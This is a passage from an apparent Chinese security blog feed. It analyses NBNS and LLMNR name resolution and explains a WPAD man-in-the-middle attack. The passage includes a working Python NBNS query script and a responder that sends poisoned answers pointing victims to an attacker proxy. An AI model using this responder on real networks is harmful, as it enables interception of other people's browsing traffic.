    <content type="html"><![CDATA[<p>本文阐述了 NetBIOS 框架下的相关协议的区别， 重点对 NBNS 协议进行了分析，同时提出了针对 NBNS 协议缺陷进行 WPAD 中间人攻击的思路。</p><h2 id="0x00-NetBIOS-相关协议"><a href="#0x00-NetBIOS-相关协议" class="headerlink" title="0x00 NetBIOS 相关协议"></a>0x00 NetBIOS 相关协议</h2><p><strong>NetBIOS（Network Basic Input/Output System，网络基本输入输出系统）</strong>，一般指用于局域网通信的一套 <strong>API</strong>（严格的说 NetBIOS 并不是一个网络协议），提供了一种允许局域网内不同电脑能够建立和使用连接服务的功能。</p><p><strong>NetBEUI（NetBIOS Enhanced User Interface，NetBIOS 增强用户接口）</strong>，可以看作是 NetBIOS 协议的 <strong>扩展</strong> 版本，主要用于小型局域网中的主机通信，目前基本已经淘汰。</p><blockquote><p>注：NetBIOS 和 NetBEUI，都是基于以太网广播的，也就是只能识别 MAC 地址，没有更高层的协议头部（如 IP、TCP/UDP），所以是无法通过路由器的。</p></blockquote><p><strong>NBT（NetBIOS over TCP/IP，简称 NBT 或者 NetBT）</strong>，是一个网络协议，允许以前使用 NetBIOS API 的应用程序能够在 TCP/IP 协议栈中使用。如今，NBT 已经逐渐地 <strong>代替</strong> NetBIOS 成为主流协议，因为它不仅适用于以太网，更适用于现代的 TCP/IP 网络。</p><blockquote><p><em>Wireshark</em> 中是这样解释的：<em>NetBIOS over TCP/IP (also called NBT) seems to slowly supersede all the other NetBIOS variants.</em></p><p>译：NetBIOS over TCP/IP 也叫做 NBT，已经逐渐淘汰并取代其他的 NetBIOS 变形协议或扩展协议。</p></blockquote><p>NetBIOS 和 NBT 的具体关系如图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/382300-20160109151303168-1561702700.gif" alt="NetBIOS over TCP/IP 协议栈"></p><p>如上图所示，<strong>NBT 是一个框架</strong>，提供了三种不同的服务，即 <strong>NBNS、NBDS、NBSS</strong> 三个协议。</p><blockquote><p>注：在使用 Wireshark 等抓包工具来捕获数据包时，是抓不到 NBT 协议的数据包的，只能抓到 NBNS、NBDS、NBSS 这三种协议的数据包。</p></blockquote><p>协议的具体描述如下：</p><ul><li><p><strong>NBNS（NetBIOS Name Service，NetBIOS 名称服务器）</strong>，类似于 DNS 服务，使用 UDP/137 或 TCP/137 端口，在基于 NetBIOS 名称访问的网络上提供名称注册和名称解析服务，<strong>通常也被称为 NBT-NS</strong>。关闭 137 端口，则无法使用 WINS 服务。</p><blockquote><p>Microsoft 的 NBNS 实现称为 WINS（Windows Internet Name Service，Windows 网络名称服务）</p></blockquote></li><li><p><strong>NBDS（NetBIOS Datagram Service，NetBIOS 数据报服务器）</strong>，使用 UDP/138 端口，主要用于提供 NetBIOS 环境下的计算机名浏览功能，很少使用。</p><blockquote><p>如果非法入侵者可以与目标主机的 138 端口建立连接请求，就能轻易获得目标主机所处的局域网网络名称以及目标主机的计算机名称。</p></blockquote></li><li><p><strong>NBSS（NetBIOS Session Service，NetBIOS 会话服务器）</strong>，使用 TCP/139 端口建立可靠的、基于连接的通信，主要用于 <em>Windows 文件和打印机共享</em> 和 <em>Linux Samba 服务</em>。关闭 139 端口，则无法在 PC 间共享文件和打印机。</p></li></ul><p><strong>SMB（Server Message Block，服务器信息块）</strong>，是一个应用层的协议，主要用于提供网络中文件共享、文件打印和进程间通信等功能，如今 SMB 主要使用于 Windows 系统中。</p><p>SMB 协议有两种运行方式，第一种通过 NetBIOS API，使用的是 UDP/137 和 UDP/138 端口以及 TCP/137 和 TCP/139 端口，如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/382300-20160109151306934-1336561833.gif" alt="使用 NetBIOS 实现的 SMB"></p><p>第二种是直接运行在 TCP 和 UDP 协议之上，使用的是 <strong>445</strong> 端口，也被称为*”Direct hosting of SMB over TCP/IP”*。</p><blockquote><p>默认 Windows 系统都支持 SMB 协议，Linux 系统没有相关组件，需要使用 Samba 服务实现 SMB 协议。</p></blockquote><h2 id="0x01-NBNS-协议分析"><a href="#0x01-NBNS-协议分析" class="headerlink" title="0x01 NBNS 协议分析"></a>0x01 NBNS 协议分析</h2><p>NetBIOS 协议的概念定义在 <a href="https://tools.ietf.org/html/rfc1001">RFC 1001</a> 中、实现细节定义在 <a href="https://tools.ietf.org/html/rfc1002">RFC 1002</a> 中，文档里详细的介绍了有关于 NetBIOS、NBNS 协议的结构，配置以及安全性等内容。</p><p><strong>NBNS 的协议结构如下图所示：</strong></p><p><img src="/img/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/1562904209741.png" alt="NBNS 协议结构"></p><p>NBNS 的协议结构与 LLMNR 基本一致，可以参考 <em>利用 LLMNR 名称解析缺陷劫持内网指定主机会话</em> 中对 LLMNR 协议的解析。不同之处在于 NBNS 协议中的主机名称是经过 <strong>编码</strong> 的，而 LLMNR 中是以明文传递，在 Python 的 dpkt 库中有实现其编码和解码的源码：</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_name</span>(<span class="hljs-params">name</span>):</span><br><span class="hljs-string">&quot;&quot;&quot;Return the NetBIOS first-level encoded name.&quot;&quot;&quot;</span><br>l = []<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> struct.pack(<span class="hljs-string">&#x27;16s&#x27;</span>, name):<br>    c = <span class="hljs-built_in">ord</span>(c)<br>    l.append(<span class="hljs-built_in">chr</span>((c &gt;&gt; <span class="hljs-number">4</span>) + <span class="hljs-number">0x41</span>))<br>    l.append(<span class="hljs-built_in">chr</span>((c &amp; <span class="hljs-number">0xf</span>) + <span class="hljs-number">0x41</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(l)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode_name</span>(<span class="hljs-params">nbname</span>):</span><br><span class="hljs-string">&quot;&quot;&quot;Return the NetBIOS first-level decoded nbname.&quot;&quot;&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(nbname) != <span class="hljs-number">32</span>:<br>    <span class="hljs-keyword">return</span> nbname<br>l = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">2</span>):<br>    l.append(<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(nbname[i]) - <span class="hljs-number">0x41</span>) &lt;&lt; <span class="hljs-number">4</span>) |<br>                 ((<span class="hljs-built_in">ord</span>(nbname[i+<span class="hljs-number">1</span>]) - <span class="hljs-number">0x41</span>) &amp; <span class="hljs-number">0xf</span>)))<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(l).split(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>使用 Wireshark 可以快速抓取到 NBNS 协议的数据包，如下图：</p><p><img src="/img/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/1562905742768.png" alt="经过编码后的主机名称"></p><h2 id="0x02-NBNS-名称解析过程"><a href="#0x02-NBNS-名称解析过程" class="headerlink" title="0x02 NBNS 名称解析过程"></a>0x02 NBNS 名称解析过程</h2><p>NBNS 名称解析的具体过程可以查看 <em>Windows 名称解析机制探究及缺陷利用</em>，一种常见的名称解析过程及利用如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/20171207135158-bd391ebe.png" alt="NetBIOS 名称解析过程"></p><h2 id="0x03-Python-实现-NetBIOS-协议的质询与应答"><a href="#0x03-Python-实现-NetBIOS-协议的质询与应答" class="headerlink" title="0x03 Python 实现 NetBIOS 协议的质询与应答"></a>0x03 Python 实现 NetBIOS 协议的质询与应答</h2><p>NBNS 协议的质询过程实际上就是进行了一个广播，质询的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> socket, struct<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NBNS_Query</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,name</span>):</span><br>        self.name = name<br>        self.populate()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">populate</span>(<span class="hljs-params">self</span>):</span><br>        self.HOST = <span class="hljs-string">&#x27;192.168.16.255&#x27;</span><br>        self.PORT = <span class="hljs-number">137</span><br>        self.nqs = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br><br>        self.QueryData = (<br>        <span class="hljs-string">&quot;\xa9\xfb&quot;</span>  <span class="hljs-comment"># Transaction ID</span><br>        <span class="hljs-string">&quot;\x01\x10&quot;</span>  <span class="hljs-comment"># Flags Query</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>  <span class="hljs-comment"># Question:1</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Answer RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Authority RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Additional RRS</span><br>        <span class="hljs-string">&quot;\x20&quot;</span>      <span class="hljs-comment"># length of Name:32</span><br>        <span class="hljs-string">&quot;NAME&quot;</span>      <span class="hljs-comment"># Name   </span><br>        <span class="hljs-string">&quot;\x00&quot;</span>      <span class="hljs-comment"># NameNull</span><br>        <span class="hljs-string">&quot;\x00\x20&quot;</span>  <span class="hljs-comment"># Query Type:NB</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>) <span class="hljs-comment"># Class</span><br><br>        self.data = self.QueryData.replace(<span class="hljs-string">&#x27;NAME&#x27;</span>, struct.pack(<span class="hljs-string">&quot;32s&quot;</span>, self.encode_name(self.name)))<br><br>    <span class="hljs-comment"># From http://code.google.com/p/dpkt/</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_name</span>(<span class="hljs-params">self,name</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;Return the NetBIOS first-level encoded name.&quot;&quot;&quot;</span><br>        l = []<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> struct.pack(<span class="hljs-string">&#x27;16s&#x27;</span>, name):<br>            c = <span class="hljs-built_in">ord</span>(c)<br>            l.append(<span class="hljs-built_in">chr</span>((c &gt;&gt; <span class="hljs-number">4</span>) + <span class="hljs-number">0x41</span>))<br>            l.append(<span class="hljs-built_in">chr</span>((c &amp; <span class="hljs-number">0xf</span>) + <span class="hljs-number">0x41</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(l)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;NBNS Querying... -&gt; %s&quot;</span> % self.name<br>            self.nqs.sendto(self.data, (self.HOST, self.PORT))<br>        self.nqs.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    nbns = NBNS_Query(<span class="hljs-string">&quot;WPAD&quot;</span>)<br>    nbns.Query()<br></code></pre></td></tr></table></figure><p>NBNS 应答数据包的具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> socket, struct,binascii<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NBNS_Answer</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, addr</span>):</span><br><br>        self.IPADDR  = addr<br>        self.nas = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>        self.init_socket()<br>        self.populate()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">populate</span>(<span class="hljs-params">self</span>):</span><br><br>        self.AnswerData = (<br>        <span class="hljs-string">&quot;TID&quot;</span>              <span class="hljs-comment"># Transaction ID</span><br>        <span class="hljs-string">&quot;\x85\x00&quot;</span>         <span class="hljs-comment"># Flags Query</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>         <span class="hljs-comment"># Question</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>         <span class="hljs-comment"># Answer RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>         <span class="hljs-comment"># Authority RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>         <span class="hljs-comment"># Additional RRS</span><br>        <span class="hljs-string">&quot;\x20&quot;</span>             <span class="hljs-comment"># length of Name:32</span><br>        <span class="hljs-string">&quot;NAME&quot;</span>             <span class="hljs-comment"># Name   </span><br>        <span class="hljs-string">&quot;\x00&quot;</span>             <span class="hljs-comment"># NameNull</span><br>        <span class="hljs-string">&quot;\x00\x20&quot;</span>         <span class="hljs-comment"># Query Type:NB</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>         <span class="hljs-comment"># Class</span><br>        <span class="hljs-string">&quot;\x00\x00\x00\xa5&quot;</span> <span class="hljs-comment"># TTL</span><br>        <span class="hljs-string">&quot;\x00\x06&quot;</span>         <span class="hljs-comment">#</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>         <span class="hljs-comment"># Null</span><br>        <span class="hljs-string">&quot;IPADDR&quot;</span>)          <span class="hljs-comment"># IP Address</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_socket</span>(<span class="hljs-params">self</span>):</span><br>        self.HOST = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>        self.PORT = <span class="hljs-number">137</span><br>        self.nas.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        self.nas.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="hljs-number">255</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode_name</span>(<span class="hljs-params">self, nbname</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;Return the NetBIOS first-level decoded nbname.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(nbname) != <span class="hljs-number">32</span>:<br>            <span class="hljs-keyword">return</span> nbname<br>        l = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">2</span>):<br>            l.append(<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(nbname[i]) - <span class="hljs-number">0x41</span>) &lt;&lt; <span class="hljs-number">4</span>) |<br>                         ((<span class="hljs-built_in">ord</span>(nbname[i+<span class="hljs-number">1</span>]) - <span class="hljs-number">0x41</span>) &amp; <span class="hljs-number">0xf</span>)))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(l).split(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Answser</span>(<span class="hljs-params">self</span>):</span><br>        self.nas.bind((self.HOST, self.PORT))<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Listening...&quot;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>            data, addr = self.nas.recvfrom(<span class="hljs-number">1024</span>)<br>            tid  = data[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]           <br>            name = data[<span class="hljs-number">13</span>:<span class="hljs-number">45</span>]<br>            data = self.AnswerData.replace(<span class="hljs-string">&#x27;TID&#x27;</span>, tid)<br>            data = data.replace(<span class="hljs-string">&#x27;NAME&#x27;</span>, name)<br>            data = data.replace(<span class="hljs-string">&#x27;IPADDR&#x27;</span>, socket.inet_aton(self.IPADDR))<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Poisoned answer(%s) sent to %s for name %s &quot;</span> % (self.IPADDR, addr[<span class="hljs-number">0</span>], self.decode_name(name))<br>            self.nas.sendto(data, addr)<br>        self.nas.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    nbns = NBNS_Answer(<span class="hljs-string">&quot;11.22.33.44&quot;</span>)<br>    nbns.Answser()<br></code></pre></td></tr></table></figure><h2 id="0x04-利用-NBNS-名称解析进行基于-WPAD-的中间人攻击思路解析"><a href="#0x04-利用-NBNS-名称解析进行基于-WPAD-的中间人攻击思路解析" class="headerlink" title="0x04 利用 NBNS 名称解析进行基于 WPAD 的中间人攻击思路解析"></a>0x04 利用 NBNS 名称解析进行基于 WPAD 的中间人攻击思路解析</h2><p>利用 NBNS 名称解析进行基于 WPAD 的中间人攻击本质上还是利用了 Windows 系统的名称解析顺序和 NBNS 协议的缺陷。结合 <em>WPAD 协议分析及内网渗透利用</em> 所述，在工作组环境中，客户端主机执行 WPAD 功能时，会遵循 Windows 系统的名称解析顺序，查询的名称均为 <strong>WPAD</strong>。那么，我们先广播进行“WPAD”名称的注册，然后监听 137 端口（如图5），等待局域网其他已启用 WPAD 功能的主机使用 IE 浏览器连接网络时，即可将受害者主机的浏览器代理设置为攻击者指定的代理服务器，之后就可以获得受害者的浏览器的上网记录。</p><p>我们模拟出一个简单的攻击场景，如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/20171207135331-f46fc93c.png" alt="利用 NBNS 名称解析进行基于 WPAD 的中间人攻击 "></p><p>攻击者开启 NetBIOS 恶意应答程序，并监听 80 端口提供恶意 PAC 配置文件（wpad.dat）的下载，同时开启代理服务器（这里使用的是 Burp Suite HTTP 代理服务器）；</p><p>受害者主机（Windows XP） 打开利用 NBNS 名称解析进行基于 WPAD 的中间人攻击  IE 浏览器（已启用 WPAD  功能）开始上网，此时浏览器就会寻找当前局域网中的代理服务器，实际上是进行了 WPAD 的名称查询，可以从图中看到攻击者的恶意应答程序做了恶意响应，同时提供 PAC 配置文件下载的 HTTP 服务器打印出了日志信息，表明此时受害者的浏览器已经下载了恶意 PAC 配置文件（该文件内容为代理服务器地址信息）；</p><p>之后，从 Burp Suite 中可以看到，受害者的浏览器使用了攻击者指定的代理服务器进行上网。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>利用 NetBIOS 域名解析协议进行中间人攻击的方式还有很多，关于 NetBIOS 协议的内容可以在相关的 RFC 文档中查阅，其中还有不少东西可以在内网渗透中利用到，如 OPCODE 字段的取值、BROWSER 协议等等，不论是攻击还是防御都需要进一步的研究。</p><p><strong>参考文章：</strong><br><a href="https://xz.aliyun.com/t/1739">https://xz.aliyun.com/t/1739</a><br><a href="https://blog.sina.com.cn/s/blog_614f473101017e10.html">https://blog.sina.com.cn/s/blog_614f473101017e10.html</a><br><a href="https://www.cnblogs.com/wangaohui/p/5116519.html">https://www.cnblogs.com/wangaohui/p/5116519.html</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPAD</tag>
      
      <tag>Windows</tag>
      
      <tag>NBNS</tag>
      
      <tag>中间人攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用 LLMNR 名称解析缺陷劫持内网指定主机会话</title>
    <link href="/post/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/"/>
    <url>/post/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/</url>
    
    <content type="html"><![CDATA[<p>本文将会对 LLMNR 协议进行分析并用 Python 实现质询和应答，之后重点阐述利用 LLMNR 在名称解析过程中的缺陷进行实战攻击的部分思路。</p><h2 id="0x00-LLMNR-简介"><a href="#0x00-LLMNR-简介" class="headerlink" title="0x00 LLMNR 简介"></a>0x00 LLMNR 简介</h2><p>从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议——LLMNR，主要用于局域网中的名称解析。LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是一个仅次于  DNS 的名称解析方式，更重要的是在 Linux 操作系统中也实现了 LLMNR。</p><h2 id="0x01-LLMNR-协议分析"><a href="#0x01-LLMNR-协议分析" class="headerlink" title="0x01 LLMNR 协议分析"></a>0x01 LLMNR 协议分析</h2><p>LLMNR 协议定义在 <a href="https://tools.ietf.org/html/rfc4795">RFC 4795</a> 中。文档里详细的介绍了有关于 LLMNR 协议的结构，配置以及安全性等内容。</p><ul><li>LLMNR 的协议结构如下图所示：</li></ul><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160617-02a1becc-d413-1.png" alt="LLMNR 协议结构"></p><ul><li>LLMNR 协议结构图中各个字段的说明如下：<ul><li>ID - Transaction ID 是一个随机生成的用来标识质询与应答的 16 位标识符。</li><li>QR - 0 为查询，1 为响应。</li><li>OPCODE - 是一个 4 位的字段，用来指定在此消息中的查询类型，该字段的值会在发起查询时被设置并复制到响应消息中。目前此规范定义了标准的查询和响应（OPCODE 的值为零）的行为，在未来的规范中可以在 LLMNR 中定义其他的 OPCODE。  </li><li>C - 冲突位</li><li>TC - 截断位</li><li>T - 暂定，无标志</li><li>Z - 保留位</li><li>RCODE - 响应码</li><li>QDCOUNT -  16 位的无符号整数，指定在质询部分中的条目数量。</li><li>ANCOUNT -  16 位的无符号整数，指定在应答部分中的资源记录数量。</li><li>NSCOUNT -  16 位的无符号整数，指定在权威记录部分的名称服务器资源记录数量 。</li><li>ARCOUNT -  16 位的无符号整数，指定在附加记录部分的资源记录数量。</li></ul></li></ul><h2 id="0x02-LLMNR-名称解析过程"><a href="#0x02-LLMNR-名称解析过程" class="headerlink" title="0x02 LLMNR 名称解析过程"></a>0x02 LLMNR 名称解析过程</h2><p>一个完整的正常的 LLMNR 名称解析过程如下图所示（ 假定主机 B 已加入了组播组中）：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160636-0e06ea6c-d413-1.png" alt="一个完整的正常的 LLMNR 名称解析过程"></p><p>使用 Wireshark 抓取一个完整的 LLMNR 质询/应答过程的数据包，如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160649-1631b05a-d413-1.png" alt="一个完整的 LLMNR 质询/应答过程数据包"></p><p>从上图可以看到，编号为 No.3 和 No.4 的数据包证明了主机 A 分别使用自己的 IPv4 地址和 IPv6 地址向 IPv4 和  IPv6 的广播地址进行了广播，质询数据包的 TID 为 0xc7f7。查询的地址类型为请求主机 B 的 IPv4 地址，这一点可以从 A 或  AAAA 进行区别，一个 A 表示请求的地址类型为 IPv4 地址，四个 A（AAAA）表示请求的地址类型为 IPv6 地址。</p><p>编号为 No.5 的数据包证明了主机 B（192.168.16.130）收到请求数据包后，发现有主机请求自己的 IP地址，于是向主机 A  进行单播应答，将自己的 IP 地址单播给了主机 A，应答的地址类型为 IPv4，同时该数据包的 TID 的值为上面主机 A 进行广播的数据包的  TID（0xc7f7）。</p><p>质询的数据包的详细结构如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160724-2aa8db3a-d413-1.png" alt="质询的数据包详细结构"></p><p>应答的数据包的详细结构如下图所示：</p><p><img 